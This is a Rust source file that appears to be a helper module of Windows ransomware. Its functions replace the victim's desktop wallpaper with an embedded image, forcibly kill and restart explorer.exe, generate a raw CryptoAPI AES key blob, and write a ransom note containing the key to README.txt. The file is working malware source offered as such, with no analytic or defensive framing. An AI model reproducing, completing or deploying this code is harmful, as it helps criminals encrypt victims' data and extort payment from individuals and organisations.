use passwords::PasswordGenerator;
use std::ffi::OsStr;
use std::fs::File;
use std::io::Write;
use std::os::windows::ffi::OsStrExt;
use std::path::{Path, PathBuf};
use std::process::Command;

use winapi::um::winuser::{
    SystemParametersInfoW, SPIF_SENDWININICHANGE, SPIF_UPDATEINIFILE, SPI_SETDESKWALLPAPER,
};

/// Write the embedded wallpaper image to `directory` and set it as the current desktop wallpaper.
pub fn change_wallpaper(directory: &str) -> Result<(), String> {
    let image_data = include_bytes!("../../resources/wallpaper.png");

    let mut wallpaper_path = PathBuf::from(directory);
    wallpaper_path.push("wallpaper.bmp");

    let mut file = File::create(&wallpaper_path)
        .map_err(|_| format!("Failed to create {}", wallpaper_path.display()))?;
    file.write_all(image_data)
        .map_err(|_| "Failed to write wallpaper file".to_string())?;

    let path_str = wallpaper_path
        .to_str()
        .ok_or("Failed to convert wallpaper path to string")?;
    let pwstr = str_to_pwstr(path_str);

    let success = unsafe {
        SystemParametersInfoW(
            SPI_SETDESKWALLPAPER,
            0,
            pwstr.as_ptr() as *mut _,
            SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE,
        ) != 0
    };

    if !success {
        return Err("Failed to change the wallpaper".to_string());
    }

    force_wallpaper_refresh();
    Ok(())
}

fn str_to_pwstr(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

fn force_wallpaper_refresh() {
    let _ = Command::new("taskkill")
        .args(["/F", "/IM", "explorer.exe"])
        .output();
    std::thread::sleep(std::time::Duration::from_secs(1));
    let _ = Command::new("explorer").spawn();
}

/// Generate a raw AES key blob (CryptoAPI format) using a password generator.
pub fn generate_key() -> Vec<u8> {
    let mut blob: Vec<u8> = vec![8u8, 2, 0, 0, 15, 102, 0, 0, 24, 0, 0, 0];
    let generator: PasswordGenerator = PasswordGenerator {
        length: 120,
        numbers: true,
        lowercase_letters: true,
        uppercase_letters: true,
        symbols: true,
        spaces: true,
        exclude_similar_characters: false,
        strict: true,
    };

    let generated_key = generator.generate_one().unwrap();
    blob.extend(generated_key.as_bytes());
    blob
}

/// Write the ransom note (with `%KEY%` replaced) into `note_dir/README.txt`.
/// Returns the path of the written file.
pub fn write_ransom_note(
    note_dir: &Path,
    encoded_key: &str,
    ransom_note: &str,
) -> Result<PathBuf, std::io::Error> {
    std::fs::create_dir_all(note_dir)?;
    let note_path = note_dir.join("README.txt");
    let content = ransom_note.replace("%KEY%", encoded_key);
    let mut file = File::create(&note_path)?;
    writeln!(&mut file, "{}", content)?;
    Ok(note_path)
}
